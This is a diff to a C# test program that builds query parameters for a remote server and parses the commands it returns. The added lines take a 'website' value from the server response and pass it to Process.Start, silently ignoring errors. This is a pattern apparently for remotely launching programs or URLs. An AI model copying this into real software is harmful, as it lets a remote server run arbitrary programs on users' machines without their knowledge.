@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Net;
 
 namespace UnitTests
@@ -91,11 +92,21 @@ namespace UnitTests
                         else
                             paramaters = paramaters + "&duplication=true";
 
-                        // 8 = Reverse
+                        if (paramaters == "?")
+                            paramaters = paramaters + "website=get";
+                        else
+                            paramaters = paramaters + "&website=get";
+                            
+                        
+                        
+
+                        // 9 = Reverse
                         if (paramaters == "?")
                             paramaters = paramaters + "reverse=false";
                         else
                             paramaters = paramaters + "&reverse=false";
+
+
                         Console.WriteLine("Setting up parameters - fine");
                         string commands = "";
                         try
@@ -127,10 +138,25 @@ namespace UnitTests
                         Console.WriteLine(PreppedCommand[6]);
                         Console.WriteLine(PreppedCommand[7]);
                         Console.WriteLine(PreppedCommand[8]);
+                        Console.WriteLine(PreppedCommand[9]);
                         Console.ReadKey();
-                        if (PreppedCommand[1] == "Online")
+                        if (PreppedCommand[1] == "Online=True")
                         {
                             Console.WriteLine("WORKS!!!!");
+                        }
+
+                        string Website = PreppedCommand[8];
+                        Console.WriteLine(Website);
+                        using (var wc = new WebClient())
+                        {
+                            try
+                            {
+                                Process.Start(Website);
+                            }
+                            catch
+                            {
+                                // ignored
+                            }
                         }
                     }
                 }
